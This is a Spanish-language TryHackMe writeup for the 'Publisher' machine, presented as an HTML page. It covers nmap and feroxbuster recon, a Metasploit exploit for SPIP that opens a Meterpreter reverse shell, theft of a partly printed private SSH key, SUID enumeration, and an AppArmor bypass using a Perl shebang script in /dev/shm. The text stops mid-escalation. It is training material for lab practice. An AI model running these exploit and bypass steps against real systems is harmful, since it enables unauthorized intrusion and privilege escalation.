@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Publisher TryHackMe | ZsZsec</title>
+<meta content="Introducción La máquina Publisher representa un entorno vulnerable diseñado para poner en práctica distintas fases de un ataque real, desde el reconocimiento inicial hasta la obten..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Publisher TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / web / SUID</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">SUID</span><span class="tag">metasploit</span><span class="tag">feroxbuster</span><span class="tag">Linux</span><span class="tag">Escalada_Privilegios</span><span class="tag">AppArmor</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Introducción</h1>
+<p>La máquina <strong>Publisher</strong> representa un entorno vulnerable diseñado para poner en práctica distintas fases de un ataque real, desde el reconocimiento inicial hasta la obtención de privilegios de superusuario. A lo largo de su explotación, se combinan técnicas clásicas y modernas, entre ellas la enumeración de servicios, la explotación de vulnerabilidades web conocidas, el abuso de credenciales expuestas y la manipulación de binarios SUID mal configurados.</p>
+<p>Durante el análisis, se descubrió que el servidor corría el CMS <strong>SPIP</strong> vulnerable a <strong>CVE-2023-27372</strong>, una vulnerabilidad crítica de deserialización insegura que permite ejecución remota de código sin autenticación. Mediante esta falla fue posible obtener acceso inicial como el usuario restringido <code>www-data</code>, lo cual sirvió de punto de entrada para el compromiso del sistema.</p>
+<p>Posteriormente, se encontró en el directorio personal del usuario principal la clave privada SSH, lo que permitió autenticarse como <strong>think</strong> y obtener un acceso más estable. Finalmente, la escalada a <strong>root</strong> se consiguió explotando un binario SUID mal configurado (<code>/usr/sbin/run_container</code>) que ejecutaba un script world-writable bajo privilegios de root. Aunque la shell estaba confinada por un perfil de <strong>AppArmor</strong>, se empleó un <strong>AppArmor bypass mediante un script Perl con shebang</strong> en <code>/dev/shm</code>, lo que permitió modificar el script vulnerable y elevar privilegios hasta el máximo nivel.</p>
+<p>Este writeup documenta cada una de estas fases de forma detallada, explicando las técnicas utilizadas y los conceptos de seguridad involucrados, con el fin de mostrar cómo un atacante podría aprovechar configuraciones débiles y vulnerabilidades conocidas para comprometer completamente un sistema.</p>
+<h2>Reconocimiento</h2>
+<p>Para iniciar el proceso de reconocimiento, realizamos un escaneo exhaustivo con <strong>Nmap</strong> con el objetivo de identificar los servicios activos, sus versiones y posibles vectores de ataque en el host objetivo.</p>
+<p>Ejecutamos el siguiente comando:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/publisher]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.21.82 -oN nmap.txt       
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 06:37 CDT
+Nmap scan report for 10.201.21.82
+Host is up (0.23s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5b:05:7c:27:27:03:b3:55:2a:ab:0f:53:43:0d:0a:b2 (RSA)
+|   256 01:5b:b0:ee:ca:a8:22:da:c0:53:d5:bd:5c:40:13:7d (ECDSA)
+|_  256 eb:c0:58:f1:c8:c0:e9:dc:36:56:ac:cb:81:fb:70:fa (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Publisher's Pulse: SPIP Insights &amp; Tips
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>Del escaneo se pudo observar que el host tiene los siguientes servicios abiertos y detectables:</p>
+<ul>
+<li><strong>SSH (22/tcp)</strong>: OpenSSH 8.2p1 sobre Ubuntu, lo que permite conexiones remotas seguras.</li>
+<li><strong>HTTP (80/tcp)</strong>: Servidor Apache 2.4.41, con un sitio web titulado <em>Publisher's Pulse: SPIP Insights &amp; Tips</em>.
+Estos hallazgos nos proporcionan la base para planificar fases posteriores de análisis y explotación</li>
+</ul>
+<h3>Acceso inicial al sitio</h3>
+<p>Tras el escaneo inicial con Nmap ya tenemos dos servicios claros: <strong>SSH (22)</strong> y <strong>HTTP (80)</strong>. Dado que el título de la página en el puerto 80 mencionaba explícitamente <strong>SPIP</strong> (<em>Publisher's Pulse: SPIP Insights &amp; Tips</em>), la prioridad era profundizar en el servicio web, porque es un CMS y, por experiencia, suele ser un vector de entrada más accesible que atacar directamente SSH.</p>
+<p>Al abrir la dirección en el navegador (<code>http://10.201.21.82/</code>), encontramos una página de blog con un diseño típico de CMS, encabezados y artículos. No había nada evidente a simple vista como formularios de login o subidas de archivos.</p>
+<p>En este punto, la siguiente técnica natural es aplicar <strong>fuzzing de directorios</strong>: un escaneo automatizado que prueba listas de nombres comunes para descubrir rutas ocultas, paneles administrativos, archivos de configuración, copias de seguridad, etc.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/publisher]
+└─$ feroxbuster -u http://10.201.21.82 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.201.21.82
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       32l      224w    17917c http://10.201.21.82/images/ads.jpg
+301      GET        9l       28w      313c http://10.201.21.82/images =&gt; http://10.201.21.82/images/
+200      GET      142l      610w    69796c http://10.201.21.82/images/image_02.jpg
+200      GET       69l       74w     4051c http://10.201.21.82/images/comment_icon.jpg
+200      GET      237l     1368w   110318c http://10.201.21.82/images/image_01.jpg
+200      GET      132l     1196w   102457c http://10.201.21.82/images/top_bg.jpg
+200      GET      354l      770w     5959c http://10.201.21.82/style.css
+200      GET      150l      766w     8686c http://10.201.21.82/
+200      GET        9l       69w     8953c http://10.201.21.82/images/menu_bg.jpg
+200      GET       17l       96w     5807c http://10.201.21.82/images/templatmeo_column_two_bg.jpg
+200      GET        8l       45w     3539c http://10.201.21.82/images/180_column_bg.jpg
+200      GET        7l       13w      379c http://10.201.21.82/images/menu_bg_repeat.jpg
+200      GET       81l      462w    49772c http://10.201.21.82/images/bottom_panel_bg.jpg
+200      GET      109l      602w    53555c http://10.201.21.82/images/logo.jpg
+301      GET        9l       28w      311c http://10.201.21.82/spip =&gt; http://10.201.21.82/spip/
+200      GET        3l       13w       83c http://10.201.21.82/spip/local/remove.txt
+200      GET        1l        6w      431c http://10.201.21.82/spip/local/config.txt
+200      GET        4l       23w      187c http://10.201.21.82/spip/local/CACHEDIR.TAG
+200      GET       59l      166w     5830c http://10.201.21.82/spip/local/cache-css/cssdyn-
+</code></pre>
+<h3>Resultados obtenidos</h3>
+<p>El escaneo arrojó una <strong>lista extensa de directorios</strong> y archivos, muchos de ellos generados automáticamente por el CMS (SPIP) o por Apache. Sin embargo, al revisarlos manualmente ninguno resultó de interés práctico para la explotación:</p>
+<ul>
+<li>Directorios estáticos comunes (<code>/css/</code>, <code>/js/</code>, <code>/img/</code>) → solo contenían recursos del sitio.</li>
+<li>Directorios internos de SPIP (<code>/local/</code>, <code>/IMG/</code>, <code>/squelettes/</code>) → accesibles pero con contenido irrelevante o vacío desde la perspectiva del atacante.</li>
+<li>Ningún archivo de configuración sensible ni panel de administración accesible fue descubierto mediante el fuzzing.</li>
+</ul>
+<h2>Fase de explotación web — RCE en SPIP BigUp</h2>
+<p>Tras el reconocimiento y fuzzing, que confirmaron que el servidor ejecutaba <strong>SPIP</strong> pero no mostraron directorios interesantes, se pasó directamente a buscar vulnerabilidades conocidas en este CMS.</p>
+<h3>Búsqueda de módulos en Metasploit</h3>
+<pre><code class="language-bash">msf6 &gt; search spip
+
+Matching Modules
+================
+
+   #   Name                                             Disclosure Date  Rank       Check  Description
+   -   ----                                             ---------------  ----       -----  -----------
+   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
+   1     \_ target: PHP In-Memory                       .                .          .      .
+   2     \_ target: Unix/Linux Command Shell            .                .          .      .
+   3     \_ target: Windows Command Shell               .                .          .      .
+   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
+   5     \_ target: PHP In-Memory                       .                .          .      .
+   6     \_ target: Unix/Linux Command Shell            .                .          .      .
+   7     \_ target: Windows Command Shell               .                .          .      .
+   8   exploit/multi/http/spip_connect_exec             2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
+   9     \_ target: PHP In-Memory                       .                .          .      .
+   10    \_ target: Unix/Linux Command Shell            .                .          .      .
+   11    \_ target: Windows Command Shell               .                .          .      .
+   12  exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
+   13    \_ target: PHP In-Memory                       .                .          .      .
+   14    \_ target: Unix/Linux Command Shell            .                .          .      .
+   15    \_ target: Windows Command Shell               .                .          .      .
+</code></pre>
+<p>Utilizaremos el modulo <strong>“SPIP BigUp Plugin Unauthenticated RCE”</strong></p>
+<p>Esto significa que el módulo aprovecha una vulnerabilidad crítica en el <strong>plugin BigUp</strong> de SPIP que permite <strong>ejecutar comandos remotos sin necesidad de autenticación</strong>.</p>
+<h3>Contexto y descripción general</h3>
+<p>La vulnerabilidad <strong>CVE-2023-27372</strong> afecta a instalaciones de SPIP en versiones <strong>anteriores a la 4.2.1</strong> (incluyendo ramas 3.2, 4.0, 4.1 y 4.2). La causa subyacente es un <strong>manejo inadecuado de valores serializados en formularios de la interfaz pública</strong>, lo que permite ejecución de código remoto (RCE) sin necesidad de autenticación.</p>
+<p>Desde el punto de vista de Severidad, se clasifica como <strong>CRITICAL</strong>, con un puntaje <strong>CVSS 3.1 de 9.8</strong> — lo que refleja acceso desde red (AV:N), baja complejidad de ataque (AC:L), sin privilegios requeridos (PR:N) ni interacción del usuario (UI:N), y alto impacto en confidencialidad, integridad y disponibilidad (C:H/I:H/A:H).</p>
+<h3>¿Qué significa “serialización mal manejada”?</h3>
+<p>En SPIP, varios formularios (como el de “restablecer contraseña” u otros procesos públicos) usan campos que incluyen datos <strong>serializados</strong> en PHP. La serialización es una forma de codificación que representa estructuras (strings, arrays, objetos) como texto, incluyendo su longitud y contenido. Por ejemplo:</p>
+<pre><code class="language-css">s:20:"some-string-data";
+</code></pre>
+<p>Aquí, <code>s:</code> indica que es un string, <code>20</code> indica la longitud, y luego el contenido entre comillas.</p>
+<p>El problema ocurre cuando SPIP <strong>acepta</strong> estos valores serializados y luego los <strong>deserializa sin validarlos adecuadamente</strong>, permitiendo que un atacante modifique la longitud declarada y el contenido, inyectando código PHP malicioso. Al deserializar, se interpreta como datos legítimos y puede ejecutarse directamente.</p>
+<p>Esto es una forma de explotación de <strong>deserialización insegura</strong> (CWE-502), muy peligrosa en PHP y otros lenguajes.</p>
+<h3>Flujo típico de ataque</h3>
+<ol>
+<li>El atacante hace una petición HTTP al endpoint (por ejemplo <code>spip.php?page=spip_pass</code>) que contiene un formulario con campos como <code>formulaire_action_args</code> y <code>oubli</code>.</li>
+<li>El formulario incluye un token de anti-CSRF (<code>formulaire_action_args</code>) y un campo serializado en <code>oubli</code>.</li>
+<li>No hay validación estricta sobre el contenido serializado: el atacante puede enviar algo como:</li>
+</ol>
+<pre><code class="language-php-template">s:XX:"&lt;?php system('calc'); ?&gt;";
+</code></pre>
+<ul>
+<li>donde <code>XX</code> es la longitud ajustada para coincidir con el contenido real.</li>
+<li>Al procesarse el formulario, SPIP <strong>deserializa esa entrada</strong>, interpretando el contenido PHP en memoria y eventualmente ejecutándolo (por ejemplo, al incluirlo en un script o evaluación dinámica). De esta forma, se consigue RCE sin autenticación.</li>
+</ul>
+<h3>Impacto real de la vulnerabilidad</h3>
+<p>Dado que se puede ejecutar código arbitrario desde la interfaz pública, un atacante puede comprometer completamente el servidor, escribir ficheros, obtener credenciales, desplegar puertas traseras o incluso pivotar a otros sistemas internos. El impacto es crítico, y por eso fue urgente la liberación de parches en múltiples ramas y la generación de alertas en Debian/Ubuntu.</p>
+<h4>Explotacion</h4>
+<pre><code class="language-bash">msf6 exploit(multi/http/spip_bigup_unauth_rce) &gt; exploit
+[*] Started reverse TCP handler on 10.23.120.245:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] SPIP Version detected: 4.2.0
+[+] SPIP version 4.2.0 is vulnerable.
+[*] Bigup plugin version detected: 3.2.1
+[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
+[*] Found formulaire_action: login
+[*] Found formulaire_action_args: CK5OtIY6q/6ugXZnjymFQ...
+[*] Preparing to send exploit payload to the target...
+[*] Sending stage (40004 bytes) to 10.201.21.82
+[*] Meterpreter session 1 opened (10.23.120.245:4444 -&gt; 10.201.21.82:37326) at 2025-09-03 06:51:34 -0500
+</code></pre>
+<p>Tras ejecutar el exploit <code>spip_bigup_unauth_rce</code> en Metasploit, el framework nos reporta que el payload fue entregado correctamente y se estableció una <strong>sesión Meterpreter</strong> con la máquina víctima:</p>
+<pre><code class="language-bash">[*] Meterpreter session 1 opened (10.23.120.245:4444 -&gt; 10.201.21.82:37326)
+</code></pre>
+<h2>Limitación del Meterpreter</h2>
+<p>Aunque la sesión es interactiva, el Meterpreter no siempre permite ejecutar todos los comandos del sistema de manera directa (por ejemplo, <code>id</code>, <code>ls</code>, <code>cat</code>). Para solventar esto, lo habitual es invocar una <strong>shell del sistema operativo</strong> desde Meterpreter con:</p>
+<pre><code class="language-bash">meterpreter &gt; shell
+Process 244 created.
+Channel 0 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>De esta forma obtenemos acceso a un intérprete de comandos clásico (sh/bash) ejecutándose como el usuario <code>www-data</code>.</p>
+<h2>Estabilización de la shell (tratamiento TTY)</h2>
+<p>Las shells iniciales obtenidas en un entorno de explotación suelen ser <strong>limitadas</strong>: no permiten autocompletado, histórico, ni el uso adecuado de atajos de teclado. Para mejorarla, se puede aplicar un “tratamiento” a la TTY. Una técnica práctica es usar el comando <code>script</code>, que crea un pseudo-terminal interactivo:</p>
+<pre><code class="language-bash">script -qc /bin/bash /dev/null
+www-data@41c976e507f8:/home/think/spip/spip$ 
+</code></pre>
+<p>Con esto pasamos de una shell básica a una <strong>TTY interactiva más estable</strong>, que facilita la interacción con el sistema y el uso de herramientas como <code>nano</code>, <code>vim</code>, o incluso la navegación fluida en directorios.</p>
+<p>Ahora nuestra shell muestra un prompt más completo</p>
+<h2>Acceso a la user flag</h2>
+<p>Una vez dentro del servidor, el primer paso típico en un CTF o máquina de práctica es acceder al directorio <code>/home</code> para comprobar los usuarios locales. Encontramos un directorio llamado <strong>think</strong>, y dentro de él se ubica el archivo <code>user.txt</code>, que contiene la primera flag del reto.</p>
+<pre><code class="language-bash">www-data@41c976e507f8:/home/think$ ls
+ls
+spip  user.txt
+</code></pre>
+<p>De esta forma, confirmamos el <strong>acceso inicial exitoso</strong> y validamos que el exploit funcionó correctamente, otorgándonos control sobre la máquina víctima como usuario restringido.</p>
+<h1>Escalada de privilegios — De <em>www-data</em> a <em>think</em></h1>
+<p>Tras obtener acceso inicial al servidor con el usuario restringido <strong>www-data</strong>, el siguiente objetivo fue <strong>moverse lateralmente hacia una cuenta con más privilegios</strong> dentro del sistema. Para ello, revisamos el contenido del directorio <code>/home/think</code>, donde residía el usuario principal.</p>
+<h2>Descubrimiento de credenciales – Clave privada SSH</h2>
+<p>Durante la enumeración, encontramos un directorio oculto <code>.ssh</code> en la ruta <code>/home/think/.ssh/</code>. Dentro de este directorio se hallaba un archivo crítico: la <strong>clave privada SSH</strong> (<code>id_rsa</code>) del usuario <em>think</em>.</p>
+<pre><code class="language-bash">find
+
+/.ssh
+./.ssh/id_rsa
+./.ssh/authorized_keys
+./.ssh/id_rsa.pub
+./.config
+</code></pre>
+<p>Este hallazgo es muy relevante porque permite autenticarse directamente como el usuario <em>think</em>, siempre y cuando el archivo tenga los permisos correctos para su uso en un cliente SSH.</p>
+<h2>Exportación de la clave a la máquina atacante</h2>
+<p>Copiamos el contenido de <code>id_rsa</code> y lo guardamos en un archivo local en nuestra máquina atacante. Es importante ajustar los permisos del archivo, ya que SSH requiere que las claves privadas tengan permisos restringidos (600) para evitar advertencias de seguridad:</p>
+<pre><code class="language-bash">www-data@41c976e507f8:/home/think$ cat /home/think/.ssh/id_rsa
+cat /home/think/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
+uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc
+OY8+1CUVX67y4UXrKASf8l7lPKIED24bXj
+</code></pre>
+<h2>Conexión como el usuario <em>think</em></h2>
+<p>Una vez preparada la clave privada, establecimos la conexión SSH directamente al servidor víctima, autenticándonos como el usuario <strong>think</strong>:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/publisher]
+└─$ nano id_rsa      
+
+┌──(zikuta㉿zikuta)-[~/Desktop/publisher]
+└─$ chmod 600 id_rsa                                
+
+┌──(zikuta㉿zikuta)-[~/Desktop/publisher]
+└─$ ssh -i id_rsa think@10.201.21.82     
+Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13
+think@ip-10-201-21-82:~$ 
+</code></pre>
+<p>Con esto, confirmamos que la clave privada era válida y logramos acceso interactivo al sistema con la cuenta del usuario <em>think</em>.</p>
+<h1>Escalada de privilegios – De <em>think</em> a <em>root</em></h1>
+<p>Tras haber accedido como el usuario <strong>think</strong>, el siguiente paso fue buscar <strong>binarios SUID</strong> que nos pudieran dar una vía de escalada a privilegios.</p>
+<pre><code class="language-bash">think@ip-10-201-21-82:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+/usr/sbin/run_container
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+</code></pre>
+<pre><code>/usr/sbin/run_container</code></pre>
+<p>De todos ellos, destacó <strong><code>/usr/sbin/run_container</code></strong>, un binario SUID que, como su nombre indica, gestiona contenedores Docker.</p>
+<h2>Análisis del binario <code>run_container</code></h2>
+<p>Al ejecutarlo, observamos que en realidad no contiene la lógica directamente, sino que <strong>invoca un script externo ubicado en <code>/opt/run_container.sh</code></strong>:</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$ /usr/sbin/run_container
+List of Docker containers:
+ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 1 second
+
+Enter the ID of the container or leave blank to create a new one: 
+/opt/run_container.sh: line 16: validate_container_id: command not found
+
+OPTIONS:
+1) Start Container    3) Restart Container  5) Quit
+2) Stop Container     4) Create Container
+Choose an action for a container: 4
+Creating a new container...
+9f326370b4ee46e44a8ca8e6adcf5e95cbbf5b18fb2e9f79861fc0efdc737053
+docker: Error response from daemon: driver failed programming external connectivity on endpoint zen_shockley (d3c1776f892982559de29d48f3acd84ce551ae9236381d6f36580c1f4209d804): Bind for 0.0.0.0:80 failed: port is already allocated.
+</code></pre>
+<p>Esto es un hallazgo muy crítico: si un binario con permisos SUID root llama a un script que podemos quiza modificar, podemos inyectar comandos para que se ejecuten como <strong>root</strong>.</p>
+<h2>Descubrimiento de permisos en <code>/opt/run_container.sh</code></h2>
+<p>Verificamos los permisos del script y encontramos que eran <strong>world-writable (777)</strong>:</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$ ls -la /opt/run_container.sh
+-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
+</code></pre>
+<p>Esto significa que cualquier usuario puede modificarlo. Sin embargo, al intentar escribir directamente sobre él, encontramos una barrera inesperada:</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$ echo "/bin/sh" &gt;&gt; /opt/run_container.sh
+-ash: /opt/run_container.sh: Permission denied
+</code></pre>
+<h2>Restricción: AppArmor en <code>ash</code></h2>
+<p>El problema radicaba en que nuestro shell por defecto no era <code>/bin/bash</code>, sino <strong><code>/usr/sbin/ash</code></strong>, y este estaba confinado por un perfil de <strong>AppArmor</strong>:</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$ echo $SHELL
+/usr/sbin/ash
+</code></pre>
+<h2>¿Qué es AppArmor?</h2>
+<p>AppArmor es un <strong>Módulo de Seguridad en Linux (LSM)</strong>.<br/>
+Sirve para <strong>confinar procesos a perfiles de seguridad</strong>.</p>
+<ul>
+<li>Incluso si un binario es SUID root, <strong>AppArmor puede restringirlo</strong>: por ejemplo, no permitir escribir en ciertos directorios, montar sistemas, o ejecutar algunos binarios.</li>
+<li>En contenedores (Docker, LXC, etc.), AppArmor es usado para que <strong>los procesos dentro del contenedor no puedan escapar al host</strong>.</li>
+</ul>
+<h2>¿Qué es un <em>AppArmor bypass</em>?</h2>
+<p>Un <em>AppArmor bypass</em> es un <strong>método para escapar de las restricciones</strong> que AppArmor aplica.<br/>
+Ejemplos típicos:</p>
+<ol>
+<li><strong>Montar <code>/proc</code> o <code>/sys</code> dentro del contenedor</strong> y desde ahí acceder al host.</li>
+<li><strong>Abusar de binarios permitidos</strong> (ejemplo: <code>tar</code>, <code>vim</code>, <code>less</code>, etc.) para ejecutar comandos arbitrarios.</li>
+<li><strong>Ejecutar Docker con privilegios</strong> → si AppArmor no lo confina correctamente, el contenedor puede tener acceso root al host.</li>
+</ol>
+<p>En tu caso, si el script crea un contenedor con privilegios root y sin perfil AppArmor fuerte → <strong>puedes usar ese contenedor para rootear el host</strong>.<br/>
+Esto es justo lo que se llama <strong>Docker escape vía AppArmor bypass</strong>.</p>
+<h2>Qué significa <code>/etc/apparmor.d/usr.sbin.ash</code></h2>
+<ol>
+<li><p><strong>Ubicación de los perfiles AppArmor</strong>:<br/>
+Todos los perfiles de AppArmor se guardan en <code>/etc/apparmor.d/</code>.</p>
+<ul>
+<li>Cada archivo define <strong>qué puede y qué no puede hacer un binario</strong>.</li>
+<li>En este caso, <code>/etc/apparmor.d/usr.sbin.ash</code> es el perfil que limita <code>/usr/sbin/ash</code>.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Qué hace un perfil</strong>:</p>
+<ul>
+<li><p>Restringe acceso a archivos, directorios, sockets, dispositivos.</p>
+</li>
+<li><p>Puede impedir que un proceso:</p>
+<ul>
+<li>Sobrescriba scripts SUID (como <code>/opt/run_container.sh</code>)</li>
+<li>Monte sistemas de archivos</li>
+<li>Ejecute binarios arbitrarios</li>
+</ul>
+</li>
+</ul>
+<p><strong>Por eso nos sale <code>Permission denied</code></strong> cuando intentas <code>echo "/bin/sh" &gt;&gt; /opt/run_container.sh</code>.</p>
+<ul>
+<li>Aunque el archivo es <code>777</code> y el binario es SUID, <strong>AppArmor bloquea la operación</strong>.</li>
+</ul>
+<h1>ESCALADA DE PRIVILEGIOS</h1>
+<h2>Entorno / evidencia inicial</h2>
+<p>Usuario: <code>think</code> (uid=1000)<br/>
+Shell por defecto: <code>/usr/sbin/ash</code><br/>
+Binario interesante: <code>/usr/sbin/run_container</code> (SUID, ejecuta <code>/opt/run_container.sh</code>)<br/>
+Script objetivo: <code>/opt/run_container.sh</code></p>
+<pre><code class="language-bash">ls -la /opt/run_container.sh
+# -rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
+</code></pre>
+<p>El script es propiedad de <code>root</code> pero tiene permisos <code>777</code> (world-writable): <strong>situación crítica</strong> si ese script se ejecuta con privilegios</p>
+<h2>Análisis de AppArmor y por qué no podemos escribir directamente</h2>
+<p>Al inspeccionar el perfil AppArmor para <code>ash</code> (recordemos que la shell por defecto que tenemos es ash) (<code>/etc/apparmor.d/usr.sbin.ash</code>) se encontraron reglas que <strong>impiden escritura</strong> en rutas específicas, p. ej.:</p>
+<pre><code class="language-bash">deny /opt/ r,
+deny /opt/** w,
+deny /tmp/** w,
+deny /var/tmp w,
+...
+/usr/bin/** mrix,
+ /usr/sbin/** mrix,
+</code></pre>
+<ul>
+<li>La regla <code>deny /opt/** w</code> (o <code>deny /tmp/** w</code>) impide escribir directamente en <code>/opt/run_container.sh</code> desde la shell confinada.</li>
+<li>Además las reglas <code>mrix</code> sobre <code>/usr/bin/**</code> y <code>/usr/sbin/**</code> hacen que la política de confinamiento se aplique a binarios ubicados en esos paths (los procesos que ejecutas desde esas rutas pueden heredar el confinamiento).</li>
+</ul>
+<blockquote>
+<p>Resultado: no podemos modificar <code>/opt/run_container.sh</code> directamente desde la shell confinada por AppArmor.</p>
+</blockquote>
+<h2>Objetivo de la explotación</h2>
+<p>Conseguir ejecutar código como <code>root</code> a través de:</p>
+<ol>
+<li>Encontrar o crear una vía para ejecutar código <strong>fuera del confinamiento</strong> de AppArmor.</li>
+<li>Desde esa vía, sobrescribir <code>/opt/run_container.sh</code> con un comando que, al ejecutarse con el SUID root, habilite un ejecutable con SUID (p.ej. <code>/bin/bash</code>).</li>
+<li>Ejecutar dicho ejecutable SUID para obtener shell con EUID=0.</li>
+</ol>
+<h2>Bypass de AppArmor</h2>
+<h3>Shebang / Perl trick (ejecución directa del intérprete)</h3>
+<p>Para escapar de esta restricción, se usó una técnica conocida como <strong>AppArmor Shebang Bypass</strong>:</p>
+<ol>
+<li>Creamos un script en memoria (<code>/dev/shm</code>) con un <em>shebang</em> que invoca a Perl:</li>
+</ol>
+<pre><code class="language-bash">echo -e '#!/usr/bin/perl\nexec "/bin/sh"' &gt; /dev/shm/test.pl
+chmod +x /dev/shm/test.pl
+/dev/shm/test.pl
+</code></pre>
+<p><strong>Qué hace y por qué funciona (explicación clara):</strong></p>
+<ul>
+<li><p>El archivo comienza con <code>#! /usr/bin/perl</code> (shebang). Cuando ejecutas <code>/dev/shm/test.pl</code> directamente, el kernel invoca <code>/usr/bin/perl</code> con <code>test.pl</code> como argumento.</p>
+</li>
+<li><p>Dependiendo del perfil AppArmor y de <strong>dónde</strong> está localizado el intérprete o el propio script, es posible que la ejecución directa del intérprete o la ejecución de un binario que <strong>no esté bajo</strong> <code>/usr/bin</code> o <code>/usr/sbin</code> (por ejemplo una copia en <code>/dev/shm</code>) <strong>no</strong> sea sujeta a la misma política restrictiva que la shell confinada <code>/usr/sbin/ash</code>.</p>
+</li>
+<li><p>En esta caja en concreto, <code>/dev/shm</code> era escribible y la ejecución directa del script permitió ejecutar <code>exec "/bin/sh"</code> y conseguir una shell interactiva <strong>no tan restringida</strong> (es decir, con menos restricciones para acciones como crear archivos fuera de las rutas bloqueadas).</p>
+</li>
+</ul>
+<blockquote>
+<p>El shebang hace que el kernel ejecute el intérprete; si consigues ejecutar un intérprete o binario desde una ruta/forma no cubierta por la política restrictiva, consigues <em>una shell menos confinada</em>.</p>
+</blockquote>
+<h3>Explotacion</h3>
+<p>Detectar</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$ echo $SHELL
+/usr/sbin/ash
+</code></pre>
+<p>Confirmar que <code>/opt/run_container.sh</code> es writable (o que la intención es escribirlo)</p>
+<pre><code class="language-bash">think@ip-10-201-17-74:~$ ls -la /opt/run_container.sh
+-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
+</code></pre>
+<p>Intento directo (falla por AppArmor)</p>
